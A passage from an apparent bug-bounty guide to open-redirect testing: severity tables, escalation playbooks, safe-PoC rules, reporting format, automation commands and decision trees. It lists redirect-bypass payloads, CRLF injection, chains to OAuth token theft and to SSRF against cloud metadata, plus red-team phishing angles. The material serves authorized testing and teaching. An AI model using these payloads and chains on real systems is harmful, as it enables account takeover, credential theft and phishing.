| 3 | **"It redirects to evil.com" with nothing riding along**, reported as High/Critical | Bare redirect is Low–Medium. | A token/scheme/allow-list escalation exists (§10–§13). |
| 4 | **Server *fetches* the URL** reported as "open redirect" | That's **SSRF**, a different class. | Report it as SSRF (usually higher) — don't mislabel. |
| 5 | **Reflected `javascript:` in a `Location` header** claimed as XSS | Browsers ignore non-http schemes in `Location`. | It's a **client-side** JS sink (§10) that executes. |
| 6 | **Redirect requires the victim to paste/edit the URL** | Not a realistic delivery. | A single crafted link auto-redirects (or one natural click). |
| 7 | **Open redirect on an unrelated third-party domain** you found via the target | Wrong asset/out of scope. | It's the target's own host/subdomain. |
| 8 | **"Referer leak" with a Referrer-Policy that blocks it** | No actual leak. | Policy is `unsafe-url`/absent and a real secret leaks. |

> Rule of thumb: if you can't say *"a link to **target.com** sends the victim's browser to **a host I control**, and `<a token arrives / script executes / an allow-list is bypassed / credible phishing results>`,"* you have either a same-origin redirect (not a bug) or a bare redirect (Low). Find what rides along.

---

# 17. Severity Calibration — how triagers really rate open redirect

| Scenario | Typical | What moves it |
|---|---|---|
| **Open redirect → OAuth/SSO `code`/`token` theft → ATO** | **High–Critical** | Direct account takeover; no/low interaction. |
| **`javascript:`/`data:` in a JS redirect sink → DOM-XSS** | **High** | Script exec → session theft/ATO. |
| **Open redirect → SSRF allow-list/WAF bypass → internal/metadata** | **High–Critical** | Internal reach / cloud creds → RCE. |
| **Redirect param → CRLF/response splitting** | **High** | `Set-Cookie`/header injection, cache poisoning. |
| **Reset/session token leak via redirect** | **High** | Account takeover. |
| **Credible phishing on trusted origin (auto-redirect)** | **Medium** | Realistic credential-theft narrative. |
| **Bare off-origin redirect, click-through anchor, nothing rides along** | **Low** | It's a phishing aid only. |

**CVSS / CWE:**
- Bare open redirect: `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` → ~Medium/Low. **CWE-601** (URL Redirection to Untrusted Site / "Open Redirect").
- OAuth-token-theft chain: → High–Critical (`C:H/I:H`). **CWE-601 + CWE-287/384** (auth/session) — lead with the ATO.
- DOM-XSS via redirect sink: **CWE-79** (+ CWE-601 as the source).
- SSRF allow-list bypass: **CWE-918** (+ CWE-601). CRLF: **CWE-113**.

---

# 18. Impact-Escalation Playbooks — "you found X, now do Y"

### 18.1 You found: *`?next=` redirects the browser off-origin*
- **Escalate:** Is it a JS sink? → `javascript:`/`data:` for DOM-XSS (§10). Is there an OAuth flow using this host? → chain the `code`/`token` theft (§11). Is a token/session in the URL? → leak it (§13). None? → phishing PoC (§14).
- **Evidence:** the raw `Location`/rendered sink + the escalation artifact (fired script / caught token).
- **Severity:** Low → Critical by escalation.

### 18.2 You found: *validation blocks `https://evil` but you're not sure it's tight*
- **Escalate:** walk the parser-gap matrix — `//evil`, `/\evil`, `https:/\evil`, `target.com@evil`, `evil/target.com`, double-encoding, unicode dot (§7–§9).
- **Evidence:** the accepted bypass payload + the off-origin `Location`.
- **Severity:** same as a confirmed redirect; note the bypass in the report (fix must cover it).

### 18.3 You found: *an OAuth/SSO flow with strict `redirect_uri` you can't beat directly*
- **Escalate:** find an **open redirect on the allowed client host** → chain B (§11): the IdP validates the client, the open redirect bounces the `code`/`token` to your host → ATO.
- **Evidence:** the `code`/`access_token` arriving at your marker host (own account) + successful exchange/login.
- **Severity:** **High–Critical**.

### 18.4 You found: *an SSRF locked to an allow-listed host*
- **Escalate:** find an open redirect on any allow-listed host → point the SSRF at it → follow to `169.254.169.254`/internal (§12).
- **Evidence:** internal/metadata response fetched via the allowed→redirect chain.
- **Severity:** **High–Critical**.

### 18.5 You found: *the redirect param is reflected into the `Location` header*
- **Escalate:** inject `%0d%0a` → add a second header (`Set-Cookie`, `Location`) → CRLF/response splitting (§9; Host-Header/Request-Smuggling kits).
- **Evidence:** the injected header in the raw response.
- **Severity:** **High**.

---

# 19. Building a Professional, Safe PoC

```
DO:
  □ Use a MARKER HOST YOU CONTROL as the redirect target (evil.example / your VPS / an interactsh host). Never a real
    third-party or another user's resource.
  □ For token/code theft (§11/§13): run the flow with YOUR OWN account and catch YOUR OWN token at YOUR host
    (token_catcher.py). Prove ATO by exchanging YOUR token to log into YOUR test victim. Never capture a real user's.
  □ For DOM-XSS (§10): use alert(document.domain) / a benign console marker; don't exfiltrate real data.
  □ For SSRF chains (§12): read-only proof (metadata get-caller-identity), then STOP (SSRF kit discipline).
  □ Capture: the exact request (param + payload), the raw Location / rendered meta / JS sink, and the escalation artifact.
  □ Provide a single CLICKABLE PoC link on the target origin (that's the realistic delivery) + the resulting landing.
DON'T:
  □ Redirect real users anywhere, or leave a live phishing page up longer than the PoC needs.
  □ Capture other users' OAuth tokens / reset tokens / sessions.
  □ Report a bare same-origin redirect, or a server-fetch mislabeled as open redirect.
  □ Weaponize the javascript:/data: payload beyond a benign proof.
```
> The single most important restraint: **your own marker host, your own account, your own token — then stop.** You can demonstrate ATO, DOM-XSS, and SSRF-bypass entirely against yourself. Same discipline as the OAuth/SSRF/CORS guides.

**Remediation to include:** don't build redirects from client input — use a **server-side map** (a short key → a known-good URL) or an **allow-list of exact, absolute URLs**; if you must accept a target, **enforce it's a relative path** (reject anything with a scheme, `//`, `\`, `@`, or a host) and **canonicalize then re-validate** the parsed host against an allow-list (compare the *parsed* host, not a substring); strip/deny `javascript:`/`data:` schemes in client sinks; for OAuth, use **exact-match pre-registered `redirect_uri`** and don't host open redirects on client hosts; set a strict **`Referrer-Policy`**; and for server-side fetchers, don't follow redirects to non-allow-listed hosts.

---

# 20. Reporting, CWE/CVSS & De-duplication

Use `OPEN_REDIRECT_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "Open redirect on <endpoint> via <param> → <OAuth token theft → ATO | DOM-XSS | SSRF allow-list bypass>"
                — name the IMPACT, not "open redirect".
2. Severity     CVSS 3.1 vector + score + CWE-601 (+ CWE-79/918/287/113 by outcome)
3. Asset        exact endpoint + param + sink type (Location/meta/JS)
4. Summary      how you control the destination + what rides along / what it bypasses
5. Steps        numbered: the crafted link → the off-origin landing → the escalation (caught token / fired script / internal fetch)
6. PoC          a single clickable link on the target origin + the raw Location/sink + the escalation artifact (own account)
7. Impact       ATO / XSS / SSRF-internal / credible phishing — the "so what"
8. Remediation  server-side URL map / relative-path enforcement / parsed-host allow-list / scheme deny (§19)
```
**De-dup:** one root cause (an unvalidated redirect param) = one finding even if the param appears on many pages; lead with the highest-impact escalation. If the *same* redirect enables both phishing and an OAuth token theft, that's **one** chain — report the ATO. A **separate** param with a **distinct** sink (e.g. a DOM `javascript:` XSS) can be its own report if the root cause differs.

---

# 21. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
# 1) harvest URLs, grep redirect params, fuzz off-origin + bypass matrix
gau target.com | gf redirect | qsreplace 'https://evil.example' | httpx -silent -location -mc 301,302,303,307,308 \
  | grep -i 'evil.example'
python3 poc/openredir_fuzz.py -u "https://target/login?next=FUZZ" --target target.com --evil evil.example
python3 poc/redirect_payloads.py --target target.com --evil evil.example   # print the full bypass matrix
# 2) discover hidden redirect params
arjun -u https://target/login
# 3) nuclei templates
nuclei -l live.txt -tags redirect,open-redirect -o or.txt
```
- **Quality gate:** never submit "it redirects to evil.example" alone as High. Reproduce the **escalation** by hand — a caught OAuth token (own account), a fired DOM-XSS, or an SSRF-internal fetch — and prove it safely (§19). A bare redirect goes in as Low–Medium with an honest phishing narrative.

**Red-team angles:**
```
□ Phishing infra: a real target.com open-redirect link in the lure → far higher click-through + AV/URL-reputation evasion
  (the initial hop is a trusted domain). Classic in credential-harvest campaigns — report it, defenders should kill it.
□ OAuth token theft against an ADMIN/employee SSO → internal-console ATO → pivot.
□ SSRF allow-list bypass via an internal open redirect → cloud metadata → cloud takeover (SSRF kit).
□ Redirect → sister-subdomain XSS → domain-wide cookie theft.
□ Conditional-access / "trusted URL" bypass in enterprise login portals via their own open redirects.
□ Chaining a taken-over subdomain (Subdomain-Takeover kit) as a WHITELISTED redirect origin to defeat strict allow-lists.
```

---

# Appendix A — Open-Redirect Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                       OPEN REDIRECT WORKFLOW                        │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: redirect params (?next/return/url/dest/redirect_uri),    │
│    login/logout/SSO, meta-refresh, JS location= sinks, email links │
│    §3                                                              │
│ 1. BASELINE ★ : off-origin? plain evil → //evil → /\evil →         │
│    target@evil → evil/target (§4)                                  │
│ 2. SINK + BYPASS: header/meta/JS (§5) · reflect-vs-redirect (§6) · │
│    parser-gap matrix (§7) · whitelist bypass (§8) · encode/CRLF §9 │
│ 3. IMPACT ⭐ :                                                      │
│    javascript:/data: → DOM-XSS ................... §10 ⭐⭐         │
│    OAuth/SSO code/token THEFT → ATO .............. §11 ⭐⭐⭐        │
│    SSRF allow-list / WAF bypass → internal/meta .. §12 ⭐⭐⭐        │
│    token/session/secret leak → ATO ............... §13 ⭐          │
│    phishing / cookie / CSP / chain ............... §14             │
│ 4. VALIDATE → REPORT:                                             │
│    FP filter §16 (redirect≠impact; SSRF≠open-redirect) ·          │
│    CVSS+CWE-601 §17 · SAFE PoC: own host, own token §19 ·         │
│    title = IMPACT (ATO/XSS/SSRF), dedup §20                       │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Open-Redirect Decision Tree

```
Set ?param=https://evil.example (then //evil.example) (§4) →
│
├─ Browser lands OFF-origin (Location/meta/JS to evil.example)? 
│   │
│   ├─ Is the sink CLIENT-SIDE JS (location=/href/assign/replace)? → try javascript:/data: → DOM-XSS (§10). HIGH. ⭐
│   │
│   ├─ Is there an OAuth/SSO flow whose code/token targets this host? → chain token theft → ATO (§11). HIGH–CRIT. ⭐
│   │
│   ├─ Is there an SSRF locked to an allow-listed host? → redirect-on-allowed-host bounces it internal (§12). HIGH–CRIT. ⭐
│   │
│   ├─ Is a reset/session/secret token in the URL/fragment/Referer? → leak → ATO (§13). HIGH.
│   │
│   ├─ Reflected into the Location HEADER + CRLF survives? → response splitting (§9). HIGH.
│   │
│   └─ Nothing rides along? → credible phishing PoC on the trusted origin (§14). MEDIUM (Low if click-through only).
│
├─ Blocked? → parser-gap matrix: //evil, /\evil, https:/\evil, target@evil, evil/target, %2f%2f, unicode dot (§7–§9).
│             Beat the whitelist by OWNING a host inside it (subdomain takeover) or chaining an allowed open redirect (§8).
│
└─ Server FETCHES the URL (not the browser)? → this is SSRF, not open redirect → SSRF kit (§12).

ALWAYS: prove the ESCALATION (token/script/internal), use your OWN host + OWN account + OWN token (§19).
```

---

# Appendix C — Important Links & References

**Primary (learn + labs)**
- PortSwigger Web Security Academy — *DOM-based open redirection* & *OAuth authentication* (redirect_uri): https://portswigger.net/web-security/dom-based/open-redirection , https://portswigger.net/web-security/oauth
- OWASP WSTG — *Testing for Client-side URL Redirect* (WSTG-CLNT-04): https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet — *Unvalidated Redirects and Forwards*: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- PayloadsAllTheThings — *Open Redirect*: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- HackTricks — *Open Redirect*: https://book.hacktricks.xyz/pentesting-web/open-redirect

**Foundational research & real-world**
- The OAuth `redirect_uri` / open-redirect account-takeover pattern (numerous HackerOne disclosures — search *"open redirect account takeover"*, *"redirect_uri bypass token theft"*).
- SSRF allow-list bypass via open redirect (Orange Tsai / a lot of cloud-metadata write-ups) — the canonical `169.254.169.254` bounce.
- CRLF injection / HTTP response splitting via a reflected redirect param (→ this kit §9; cross-ref Host-Header & Request-Smuggling kits).

**Bug-bounty writeups**
- Disclosed HackerOne / Bugcrowd reports — search *"open redirect → OAuth token"*, *"open redirect to XSS"*, *"open redirect SSRF bypass"*, *"//evil.com bypass"*.

**Tools**
- `gau` / `waybackurls` / `katana` / `hakrawler` (URL harvest) · `gf` (`redirect` patterns) · `qsreplace` · `httpx` (`-location`) · Arjun / Param Miner (hidden params) · Burp DOM Invader (JS sinks) · Nuclei (`-tags redirect`) · this kit's `poc/` (openredir_fuzz / redirect_payloads / token_catcher).

**CWE / standards to cite**
- **CWE-601** (URL Redirection to Untrusted Site — "Open Redirect") · **CWE-79** (XSS, for `javascript:`/DOM sink) · **CWE-918** (SSRF, for allow-list bypass) · **CWE-113** (CRLF / response splitting) · **CWE-287 / CWE-384** (auth/session, for the ATO chains): https://cwe.mitre.org/

---

> **Final reminder — the one rule that pays:** *An open redirect is only a headline when something rides along or a control gives way.* On its own it's a phishing aid (Low–Medium). Escalate it: `javascript:` in a client sink is **DOM-XSS**; an OAuth `code`/`token` on the bounce is **account takeover**; a redirect on an SSRF-allow-listed host is **internal/metadata reach**; a token in the URL is a **leak → ATO**. Beat the validator with the parser-gap trio (`//`, `\`, `@`), or beat the allow-list by *owning a host inside it*. Prove it with your **own** host, **own** account, **own** token — then report the **ATO / XSS / SSRF**, not the hop. That's how a "just a redirect" becomes the Critical it was hiding.
